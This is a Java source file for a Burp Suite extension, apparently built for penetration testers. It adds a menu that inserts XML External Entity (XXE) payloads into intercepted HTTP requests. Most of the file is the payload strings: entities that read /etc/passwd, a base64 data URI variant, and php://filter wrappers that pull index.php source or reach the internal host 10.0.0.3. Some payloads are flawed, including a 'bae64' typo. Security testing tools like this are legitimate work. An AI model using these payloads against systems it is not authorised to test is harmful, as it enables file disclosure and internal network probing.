/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package burp;

import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import javax.swing.JMenu;

/**
 *
 * @author abdul.wahab
 */
public class XXE_Menu extends JMenu {
    public BurpExtender myburp;
    public String[] XXE_MenuItems = {"Basic Test","XXE 1", "XXE 2", "XXE 3", "Php wrapper in XXE", "Php wrapper in XXE 2"};
    
    XXE_Menu(BurpExtender burp){
        this.setText("XXE Snippets");
        this.myburp = burp;
        Methods.add_MenuItem_and_listener(this, XXE_MenuItems, new XXEItemListener(myburp));
    }
}


class XXEItemListener implements ActionListener {

    BurpExtender myburp;
    XXEItemListener(BurpExtender burp) {
        myburp = burp;
    }
    
    @Override
    public void actionPerformed(ActionEvent e) {
        int[] selectedIndex = myburp.context.getSelectionBounds();
        IHttpRequestResponse req = myburp.context.getSelectedMessages()[0];
        byte[] request = req.getRequest();
        byte[] param = new byte[selectedIndex[1]-selectedIndex[0]];
        System.arraycopy(request, selectedIndex[0], param, 0, selectedIndex[1]-selectedIndex[0]);
        String selectString = new String(param);
        String action = e.getActionCommand();
        byte[] newRequest = do_XXE(request, selectString, action, selectedIndex);
        req.setRequest(newRequest);
    }
    
    public byte[] do_XXE(byte[] request, String selectedString, String action, int[] selectedIndex){
        switch(action){
            case "Basic Test":
                selectedString =    "<!--?xml version=\"1.0\" ?-->\n" +
                                    "<!DOCTYPE replace [<!ENTITY example \"Doe\"> ]>\n" +
                                    " <userInfo>\n" +
                                    "  <firstName>John</firstName>\n" +
                                    "  <lastName>&example;</lastName>\n" +
                                    " </userInfo>";
                break;
            case "XXE 1":
                selectedString =    "<?xml version=\"1.0\"?>\n" +
                                    "<!DOCTYPE data [\n" +
                                    "<!ELEMENT data (#ANY)>\n" +
                                    "<!ENTITY file SYSTEM \"file:///etc/passwd\">\n" +
                                    "]>\n";
                break;
            case "XXE 2":
                selectedString =    "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n" +
                                    "  <!DOCTYPE foo [  \n" +
                                    "  <!ELEMENT foo ANY >\n" +
                                    "  <!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]>";
                break;
            case "XXE 3":
                selectedString = "<!DOCTYPE test [ <!ENTITY % init SYSTEM \"data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk\"> %init; ]><foo/>";
                break;
            case "Php wrapper in XXE":
                selectedString = "<!DOCTYPE replace [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=index.php\"> ]>";
                break;
            case "Php wrapper in XXE 2":
                selectedString =    "<!DOCTYPE foo [\n" +
                                    "<!ELEMENT foo ANY >\n" +
                                    "<!ENTITY % xxe SYSTEM \"php://filter/convert.bae64-encode/resource=http://10.0.0.3\" >\n" +
                                    "]>";
                break;
            default:
                break;
        }
        return Methods.do_modify_request(request, selectedIndex, selectedString);
    }
    

}